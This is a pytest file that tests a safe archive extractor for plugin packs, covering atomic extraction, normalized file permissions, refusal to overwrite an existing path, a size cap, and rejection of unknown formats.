def test_benign_archive_extracts_atomically(tmp_path: Path) -> None:
    dest = tmp_path / "store" / "python-pack-1.4.2"
    dest.parent.mkdir()
    result = safe_extract(corpus(BUILDER.BENIGN), dest)

    assert result.root == dest
    assert result.file_count == 2
    assert (dest / MANIFEST_FILENAME).is_file()
    assert "ruff" in (dest / "skills" / "py-style.md").read_text(encoding="utf-8")
    # Nothing but the destination: the temp directory was renamed, not copied.
    assert [p.name for p in dest.parent.iterdir()] == [dest.name]


def test_extracted_permissions_are_normalized_not_inherited(tmp_path: Path) -> None:
    """Archive modes are attacker input. World-readable plugin content in a
    shared ``/tmp`` is a leak, and an executable bit is an invitation."""
    dest = tmp_path / "pack"
    safe_extract(corpus(BUILDER.BENIGN), dest)
    for p in dest.rglob("*"):
        mode = stat.S_IMODE(p.lstat().st_mode)
        assert mode & 0o077 == 0, f"{p} is group/world accessible ({oct(mode)})"
        assert not mode & 0o111 or p.is_dir(), f"{p} kept an executable bit"


def test_refuses_to_extract_over_an_existing_destination(tmp_path: Path) -> None:
    """Activation is a pointer swap onto a *new* store entry. Writing into a
    path that already exists is how a half-updated plugin happens."""
    dest = tmp_path / "pack"
    dest.mkdir()
    (dest / "existing.md").write_text("mine", encoding="utf-8")
    before = snapshot(dest)
    with pytest.raises(FileExistsError):
        safe_extract(corpus(BUILDER.BENIGN), dest)
    assert snapshot(dest) == before


def test_archive_larger_than_the_cap_is_refused_before_parsing(tmp_path: Path) -> None:
    big = tmp_path / "huge.tar"
    big.write_bytes(corpus("too_large.tar").read_bytes())
    with pytest.raises(ArchiveTooLargeError) as ei:
        safe_extract(big, tmp_path / "pack", limits=ExtractLimits(max_archive_bytes=1024))
    assert ei.value.reason == "archive-cap"


def test_unrecognized_format_is_refused(tmp_path: Path) -> None:
    junk = tmp_path / "pack.tar.gz"
    junk.write_bytes(b"not an archive, just bytes")
    with pytest.raises(UnsafeArchiveError) as ei:
        safe_extract(junk, tmp_path / "pack")
    assert ei.value.reason == "unknown-format"
    assert not (tmp_path / "pack").exists()


